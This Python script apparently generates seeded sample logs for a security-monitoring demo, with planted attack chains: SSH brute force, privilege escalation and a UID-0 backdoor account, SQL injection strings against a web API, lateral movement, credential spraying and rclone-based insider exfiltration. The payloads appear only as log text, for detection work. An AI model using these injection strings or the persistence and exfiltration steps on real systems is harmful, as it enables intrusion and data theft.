"""
SentinelSOC - sample security log generator.

Writes four raw log files in their native formats, containing ~15,000 lines of
ordinary activity with three attack chains planted deliberately:

  Chain 1  SSH brute force -> successful login -> privilege escalation -> persistence
  Chain 2  Port scan -> SQL injection -> bulk data read
  Chain 3  After-hours insider collection -> archive -> exfiltration
  Chain 4  Stolen credentials -> lateral movement across five hosts
  Chain 5  Credential spraying, deliberately under per-account lockout

The chains are planted, not discovered. A demo where the correlation is obvious
to the room beats one that is technically impressive and invisible. Seeded, so
every run produces byte-identical files.
"""

from __future__ import annotations

import random
import sys
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

DEFAULT_SEED = 20260315
DEFAULT_DAY = datetime(2026, 3, 15, tzinfo=timezone.utc)
OUT = Path(__file__).resolve().parent.parent / "data" / "samples"

HOSTS = ["web-01", "web-02", "app-01", "app-02", "db-01", "fs-01", "win-dc-01"]
USERS = ["alice", "bob", "carol", "dinesh", "mreddy", "svc_deploy", "svc_backup", "priya"]
INTERNAL = [f"10.0.4.{i}" for i in range(10, 60)]

ATTACKER_SSH = "203.0.113.45"
ATTACKER_WEB = "198.51.100.77"
EXFIL_DEST = "185.220.101.34"

URLS = ["/", "/login", "/dashboard", "/api/orders", "/api/users/me", "/static/app.js",
        "/health", "/api/products", "/checkout", "/assets/logo.svg"]
AGENTS = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
          "curl/8.4.0"]


def main(seed: int | None = DEFAULT_SEED, out_dir: Path | None = None) -> int:
    actual_seed = seed if seed is not None else int(time.time() * 1000)
    rng = random.Random(actual_seed)
    day = DEFAULT_DAY if seed == DEFAULT_SEED else datetime.now(timezone.utc).replace(
        hour=0, minute=0, second=0, microsecond=0
    )
    dest = out_dir if out_dir is not None else OUT
    dest.mkdir(parents=True, exist_ok=True)

    def ts(h: int, m: int, s: int, micro: int = 0) -> datetime:
        return day.replace(hour=h, minute=m, second=s, microsecond=micro)

    def iso(t: datetime) -> str:
        return t.strftime("%Y-%m-%dT%H:%M:%S+00:00")

    def nginx_time(t: datetime) -> str:
        return t.strftime("%d/%b/%Y:%H:%M:%S +0000")

    # Randomize attacker IPs when using a non-default seed
    if seed != DEFAULT_SEED:
        attacker_ssh = f"{rng.randint(100,220)}.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}"
        attacker_web = f"{rng.randint(100,220)}.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}"
        exfil_dest = f"{rng.randint(100,220)}.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}"
    else:
        attacker_ssh = ATTACKER_SSH
        attacker_web = ATTACKER_WEB
        exfil_dest = EXFIL_DEST

    print(f"  seed={actual_seed}  day={day.date()}  attacker_ssh={attacker_ssh}")

    auth: list[tuple[datetime, str]] = []
    web: list[tuple[datetime, str]] = []
    fw: list[tuple[datetime, str]] = []
    win: list[tuple[datetime, str]] = []

    def add_auth(t, line): auth.append((t, f"{iso(t)} {line}"))
    def add_web(t, line): web.append((t, line))
    def add_fw(t, line): fw.append((t, f"{iso(t)} {line}"))
    def add_win(t, line): win.append((t, f"{iso(t)},{line}"))

    # ---------------------------------------------------------------- noise
    # Ordinary business-hours activity across all four sources.
    for _ in range(4200):
        t = ts(rng.randint(7, 20), rng.randint(0, 59), rng.randint(0, 59))
        host, user, ip = rng.choice(HOSTS[:5]), rng.choice(USERS[:5]), rng.choice(INTERNAL)
        if rng.random() < 0.93:
            add_auth(t, f"{host} sshd[{rng.randint(1000, 9999)}]: Accepted publickey for "
                        f"{user} from {ip} port {rng.randint(40000, 60000)} ssh2")
        else:
            add_auth(t, f"{host} sshd[{rng.randint(1000, 9999)}]: Failed password for "
                        f"{user} from {ip} port {rng.randint(40000, 60000)} ssh2")

    for _ in range(6800):
        t = ts(rng.randint(6, 22), rng.randint(0, 59), rng.randint(0, 59))
        ip = rng.choice(INTERNAL + ["203.0.113.9", "198.51.100.5", "192.0.2.30"])
        url, code = rng.choice(URLS), rng.choices([200, 200, 200, 304, 404, 500], k=1)[0]
        add_web(t, f'{ip} - - [{nginx_time(t)}] "GET {url} HTTP/1.1" {code} '
                   f'{rng.randint(180, 9000)} "-" "{rng.choice(AGENTS)}"')

    for _ in range(2600):
        t = ts(rng.randint(0, 23), rng.randint(0, 59), rng.randint(0, 59))
        add_fw(t, f"fw-01 kernel: [UFW ALLOW] IN=eth0 OUT= SRC={rng.choice(INTERNAL)} "
                  f"DST=10.0.4.10 PROTO=TCP SPT={rng.randint(40000, 60000)} "
                  f"DPT={rng.choice([80, 443, 22, 5432])} LEN={rng.randint(60, 1500)}")

    for _ in range(900):
        t = ts(rng.randint(7, 20), rng.randint(0, 59), rng.randint(0, 59))
        u = rng.choice(USERS[:5])
        add_win(t, f"4624,win-dc-01,An account was successfully logged on,"
                   f"SubjectUserName={u},IpAddress={rng.choice(INTERNAL)},LogonType=3")

    # ------------------------------------------------- chain 1: SSH -> root
    # 02:14-02:19  credential stuffing from a single external address
    targets = ["root", "admin", "test", "oracle", "postgres", "ubuntu", "git",
               "jenkins", "svc_deploy", "backup"]
    t = ts(2, 14, 3)
    for i in range(58):
        u = targets[i % len(targets)]
        add_auth(t, f"web-01 sshd[{20000 + i}]: Failed password for "
                    f"{'invalid user ' if u in ('test', 'oracle', 'git') else ''}{u} "
                    f"from {attacker_ssh} port {45000 + i} ssh2")
        add_fw(t, f"fw-01 kernel: [UFW ALLOW] IN=eth0 OUT= SRC={attacker_ssh} "
                  f"DST=10.0.4.11 PROTO=TCP SPT={45000 + i} DPT=22 LEN=64")
        t += timedelta(seconds=rng.randint(3, 8))

    t_success = ts(2, 19, 47)
    add_auth(t_success, f"web-01 sshd[20099]: Accepted password for svc_deploy "
                        f"from {attacker_ssh} port 45099 ssh2")
    add_auth(ts(2, 19, 48), "web-01 sshd[20099]: pam_unix(sshd:session): session opened "
                            "for user svc_deploy by (uid=0)")
    add_auth(ts(2, 21, 12), "web-01 sudo:  svc_deploy : TTY=pts/1 ; PWD=/home/svc_deploy ; "
                            "USER=root ; COMMAND=/bin/bash")
    add_auth(ts(2, 21, 14), "web-01 sudo: pam_unix(sudo:session): session opened for user "
                            "root by svc_deploy(uid=1004)")
    add_auth(ts(2, 23, 40), "web-01 useradd[20140]: new user: name=sysmon, UID=0, GID=0, "
                            "home=/home/sysmon, shell=/bin/bash")
    add_auth(ts(2, 24, 2), "web-01 sshd[20150]: Accepted publickey for sysmon "
                           f"from {attacker_ssh} port 45210 ssh2")

    # ------------------------------------- chain 2: scan -> SQLi -> bulk read
    t = ts(11, 2, 6)
    for port in [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995,
                 1433, 1521, 2049, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443,
                 9000, 9090, 9200, 11211, 27017, 5984, 7001, 8081, 8888, 10000,
                 4444, 5555, 6666, 7777, 8008]:
        add_fw(t, f"fw-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC={attacker_web} "
                  f"DST=10.0.4.12 PROTO=TCP SPT={rng.randint(50000, 60000)} "
                  f"DPT={port} LEN=44")
        t += timedelta(seconds=rng.randint(2, 6))

    sqli = [
        "/api/products?id=1%27%20OR%20%271%27=%271",
        "/api/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
        "/api/products?id=1%3B%20DROP%20TABLE%20sessions--",
        "/login?next=%27%20UNION%20SELECT%20NULL,version()--",
        "/api/search?q=%27%20OR%201=1--",
    ]
    t = ts(11, 12, 9)
    for i, path in enumerate(sqli):
        code = 200 if i >= 3 else 403
        add_web(t, f'{attacker_web} - - [{nginx_time(t)}] "GET {path} HTTP/1.1" '
                   f'{code} {rng.randint(200, 800)} "-" "sqlmap/1.8.2"')
        t += timedelta(seconds=rng.randint(4, 20))

    t = ts(11, 15, 30)
    for i in range(14):
        add_web(t, f'{attacker_web} - - [{nginx_time(t)}] '
                   f'"GET /api/export?table=customers&offset={i * 5000}&limit=5000 HTTP/1.1" '
                   f'200 {rng.randint(2_400_000, 3_100_000)} "-" "python-requests/2.32"')
        t += timedelta(seconds=rng.randint(20, 45))

    # ----------------------------- chain 4: lateral movement on stolen creds
    # Continues chain 1: svc_deploy is compromised, and now walks the network.
    # Successful logins, so nothing a failure-counting rule would ever catch.
    t = ts(3, 12, 40)
    for host, ip in [("db-01", "10.0.4.20"), ("app-01", "10.0.4.21"),
                     ("app-02", "10.0.4.22"), ("fs-01", "10.0.4.31"),
                     ("win-dc-01", "10.0.4.40")]:
        add_auth(t, f"{host} sshd[{21000 + rng.randint(1, 500)}]: Accepted publickey "
                    f"for svc_deploy from 10.0.4.11 port {rng.randint(45000, 46000)} ssh2")
        add_fw(t, f"fw-01 kernel: [UFW ALLOW] IN=eth0 OUT= SRC=10.0.4.11 "
                  f"DST={ip} PROTO=TCP SPT={rng.randint(45000, 46000)} DPT=22 LEN=64")
        t += timedelta(minutes=rng.randint(3, 8))

    # ---------------------------- chain 5: credential spray, under the radar
    # Two attempts per account across 26 accounts - below any per-account
    # lockout, so only counting distinct ACCOUNTS per source surfaces it.
    spray_users = [
        "aarav", "aditi", "ananya", "arjun", "bhavya", "chirag", "deepa", "esha",
        "farhan", "gaurav", "harsha", "ishan", "jaya", "kabir", "lakshmi", "manav",
        "neha", "omkar", "pooja", "rahul", "sanya", "tarun", "uma", "varun",
        "yash", "zara",
    ]
    t = ts(5, 3, 15)
    for user in spray_users:
        for _ in range(2):
            add_auth(t, f"win-dc-01 sshd[{22000 + rng.randint(1, 900)}]: Failed password "
                        f"for {user} from 198.51.100.203 port {rng.randint(40000, 60000)} ssh2")
            t += timedelta(seconds=rng.randint(20, 50))

    # ------------------------------------------- chain 3: insider exfiltration
    t = ts(22, 41, 5)
    for i in range(46):
        add_win(t, f"4663,fs-01,An attempt was made to access an object,"
                   f"SubjectUserName=mreddy,ObjectName=\\\\fs-01\\finance\\q4_{i:03d}.xlsx,"
                   f"AccessMask=0x1,IpAddress=10.0.4.31")
        t += timedelta(seconds=rng.randint(4, 14))

    add_win(ts(22, 58, 11), "4688,fs-01,A new process has been created,"
                            "SubjectUserName=mreddy,NewProcessName=C:\\Program Files\\7-Zip\\7z.exe,"
                            "CommandLine=7z a -p archive.7z \\\\fs-01\\finance\\,IpAddress=10.0.4.31")
    add_win(ts(23, 2, 40), "4688,fs-01,A new process has been created,"
                           "SubjectUserName=mreddy,NewProcessName=C:\\Users\\mreddy\\rclone.exe,"
                           "CommandLine=rclone copy archive.7z remote:backup,IpAddress=10.0.4.31")

    t = ts(23, 4, 2)
    for _ in range(12):
        add_fw(t, f"fw-01 kernel: [UFW ALLOW] IN= OUT=eth0 SRC=10.0.4.31 "
                  f"DST={exfil_dest} PROTO=TCP SPT={rng.randint(50000, 60000)} "
                  f"DPT=443 LEN={rng.randint(1_400_000, 1_900_000)}")
        t += timedelta(seconds=rng.randint(25, 70))

    # ------------------------------------------------------------- write out
    files = {
        "auth.log": auth,
        "nginx_access.log": web,
        "firewall.log": fw,
        "windows_security.log": win,
    }
    total = 0
    for name, rows in files.items():
        rows.sort(key=lambda r: r[0])
        body = "\n".join(line for _, line in rows) + "\n"
        (dest / name).write_text(body)
        total += len(rows)
        print(f"  {name:24s} {len(rows):6,d} lines")

    print(f"\n  total {total:,} lines -> {dest}")
    print("  planted chains: ssh-bruteforce-privesc | scan-sqli-exfil | insider-exfil")
    print("                  lateral-movement | credential-spray")
    return 0


if __name__ == "__main__":
    sys.exit(main())
